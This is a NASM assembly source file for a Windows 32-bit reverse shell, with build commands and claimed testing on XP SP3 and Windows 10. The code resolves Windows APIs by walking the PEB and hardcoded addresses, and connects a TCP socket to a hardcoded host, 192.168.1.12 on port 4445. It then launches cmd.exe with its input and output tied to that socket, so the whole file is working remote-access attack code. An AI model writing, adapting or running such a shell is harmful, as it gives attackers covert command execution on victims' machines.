; ========================
; @Maroder
; @for DevGnode 
; nasm -f win32 reverse_shell.s -o reverse_shell.o
; ld -m i386 reverse_shell.o -o reverse_shell32.exe
;
; targets :
;	WIN32 -  i've try this reverse shell on 
;		 XP SP3, Win10 pro Arch.
;
;=========================
[BITS 32]


%define HANDLE DWORD
%define SOCKET DWORD

WSADESCRIPTION_LEN equ 	256
WSASYS_STATUS_LEN equ 	128

; ========================
; Structure
;=========================
struc STARTUPINFO
	.cb			resd	1
	.lpReserved		resd	1
	.lpDesktop		resd	1
	.lpTitle		resd	1
	.dwX			resd	1
	.dwY			resd	1
	.dwXSize		resd	1
	.dwYSize		resd	1
	.dwXCountChars		resd	1
	.dwYCountChars		resd	1
	.dwFillAttribute	resd	1
	.dwFlags		resd	1
	.wShowWindow		resw	1
	.cbReserved2		resw	1
	.lpReserved2		resd	1
	.hStdInput		resd	1
	.hStdOutput		resd	1
	.hStdError		resd	1
endstruc

struc PROCESS_INFORMATION
	.hProcess		resd	1
	.hThread		resd	1
	.dwProcessId		resd	1
	.dwThreadId		resd	1
endstruc

struc WSAData
	.wVersion		resw	1
	.wHighVersion		resw	1
	.iMaxSockets		resw	1
	.iMaxUdpDg		resw	1
	.lpVendorInfo		resd	1
	.szDescription		resb 	WSADESCRIPTION_LEN + 1
	.szSystemStatus		resb	WSASYS_STATUS_LEN + 1
endstruc

struc IN_ADDR
	.s_addr		resd	1
endstruc
struc SOCKADDR_IN
	.sin_family	resw	1
	.sin_port	resw	1
	.sin_addr	resd	1
	.sin_zero	resb	8
endstruc


	global _start
; ========================
; DATA
;=========================
section .data
	LoadLibraryA: 	dd	0x7C801D7B ; <---
	GetProcAddress: dd	0x7C80AE30 ; <--- 
; ========================
; Pointer
;=========================
section .bss
	ssi resb 0x44
	spi resb 0x10
	swd resb 0x10A
	sss resb 0x10
	sin resb 0x4
; ========================
; text
;=========================
section .text

_start:

; Strack
; str
; str
; str
; 0000str
; kernel32 base
; ws2_32 base
; =----------------- return
;
;
	mov ebp, esp		; stack
	sub esp, 0x20		; string pointer

	mov edx, 0x30
	mov edx, [fs:edx]
	mov eax, dword[edx+0x0c]
	mov esi, dword[eax+0x1c]
	mov eax, dword[esi]
	mov edx, dword[eax+0x08]	; KernelBase
	
	mov [esp+0x18],edx

	; ===========================
	; make stack pointer str :
	; ws2_32.dll
	;============================
	xor eax,eax
	mov [esp+0x10],eax
	mov [esp+0x0c],eax
	mov ax,0x6c6c		; ll
	mov [esp+0x08],eax
	mov eax, 0x642e3233 	; d.23
	mov [esp+0x04],eax
	mov eax, 0x5f327377	; _2sw
	mov [esp],eax
	lea eax,[esp]		; ws2_32.dll
	push eax	
	
	mov edi, [LoadLibraryA]	; LoadLibraryAtry to get from FS pointer PEB/TEB
	call edi		; call
	mov [esp+0x1C], eax	; ESP+14 Offset ws2_32 base dll
	sub esp, 0x04		; size 4 SOCKET HANDLE
	
	WSAStartup:
	xor eax, eax		
	mov [esp+0x10],eax	
	mov ax,0x7075		; pu
	mov [esp+0x0c],eax	
	mov eax, 0x74726174	; trat
	mov [esp+0x08],eax
	mov eax, 0x53415357	; SASW
	mov [esp+0x04],eax
	lea edx,[esp+0x4]	; WSAStartup	

	call getproc
	mov edi,eax		; ws2_32.WSAStartup

	xor eax, eax
	push swd
	mov ax,0x0202
	push eax
	;mov edi, 0x719F6A55 
	call edi

	WSASocket:
	xor eax,eax
	mov ax,0x4174		; t
	mov [esp+0x0c],eax
	mov eax, 0x656b636f	; ekco
	mov [esp+0x08],eax
	mov eax, 0x53415357	; SASW
	mov [esp+0x04],eax
	lea edx,[esp+0x4]	; WSASocket

	call getproc
	mov edi,eax		; ws2_32.WSASocket

	xor eax, eax
	push eax
	push eax
	push eax
	mov al,0x06	; IPPROTO_TCP
	push eax	;
	sub al,0x05	; SOCK_STREAM
	push eax	;
	add al,0x01	; AF_INET
	push eax
	;mov edi,0x719F8B6A
	call edi	
	
	cmp eax,0xFFFFFFFF
	je ret

	; socket Handle
	mov edx,eax
	mov SOCKET[esp],edx
	
	; SOCKADDR_IN
	xor ebx, ebx
	inc ebx
	inc ebx
	mov WORD[ sss + SOCKADDR_IN.sin_family ],bx		; AF_INET
	mov WORD[ sss + SOCKADDR_IN.sin_port ],  0x5D11		; port 4445
	mov DWORD[ sss + SOCKADDR_IN.sin_addr ], 0x0c01a8c0 	; IP   192.168.1.12

	WSAConnect:
	xor eax,eax		; raz eax
	mov ax,0x7463		; tc
	mov [esp+0x0c],eax
	mov eax, 0x656e6e6f	; enno
	mov [esp+0x08],eax
	mov eax, 0x43415357	; CASW
	mov [esp+0x04],eax
	lea edx,[esp+0x4]	; WSAConnect

	call getproc
	mov edi,eax		; ws2_32.WSAConnect

	xor eax,eax
	mov esi,[esp]		; SOCKET
	push eax		; 
	push eax		;
	push eax		;
	push eax		;
	mov al,0x10		; sizeof SOCKADDR
	push eax		;
	mov eax,sss 		; SOCKADDR
	push eax		;	
	push esi		; socket Handle
	;mov edi, 0x71A00C81
	call edi
	
	cmp eax,0xFFFFFFFF
	je ret

	xor eax,eax
	mov edx, [esp]
	mov ah,0x01
	inc eax
	mov DWORD[ ssi + STARTUPINFO.dwFlags ], eax
	mov DWORD[ ssi + STARTUPINFO.hStdInput ], edx
	mov DWORD[ ssi + STARTUPINFO.hStdOutput ], edx
	mov DWORD[ ssi + STARTUPINFO.hStdError ], edx

	CreateProcess:
	xor 	eax, eax
	mov ax,0x4173		; As
	mov [esp+0x10],eax
	mov eax, 0x7365636f	; seco
	mov [esp+0xc],eax
	mov eax, 0x72506574	; rPet
	mov [esp+0x08],eax
	mov eax, 0x61657243	; aerC
	mov [esp+0x04],eax
	lea edx,[esp+0x4]	; CreateProcessA

	mov 	esi,[esp+0x1C]	; kernel32 base
	push	edx
	push 	esi
	mov 	edi,[GetProcAddress]
	call 	edi
	mov	edi, eax

	xor 	eax, eax
	push 	spi		; PROCESS_INFORMATION
	push 	ssi		; STARTUPINFO
	push 	eax		;
	push	eax		;
	push 	eax		;
	inc 	eax		;
	push 	eax		; true
	dec 	eax		;
	push 	eax		;
	push	eax		;
	push	_cmd		; Str CMD
	push	eax		;
	;mov 	edi, 0x7C80236B	; CreateProcessA
	call	edi		; call
	
	ExitProcess:
	xor 	eax, eax
	mov eax,0x737365	; sse
	mov [esp+0x0C],eax
	mov eax, 0x636f7250	; corP
	mov [esp+0x08],eax
	mov eax, 0x74697845	; tixE
	mov [esp+0x04],eax
	lea edx,[esp+0x4]	; ExitProcess

	mov 	esi,[esp+0x1C]	; kernel32 base
	push	edx
	push 	esi
	mov 	edi,[GetProcAddress]
	call 	edi
	mov 	edi, eax

	xor 	eax, eax
	push	eax
	call 	edi
	
	ret:
	leave

getproc:
	mov ebx,[esp+0x24]
	push edx
	push ebx
	mov edi,[GetProcAddress]
	call edi
	ret

	_cmd: 	db "cmd.exe",0
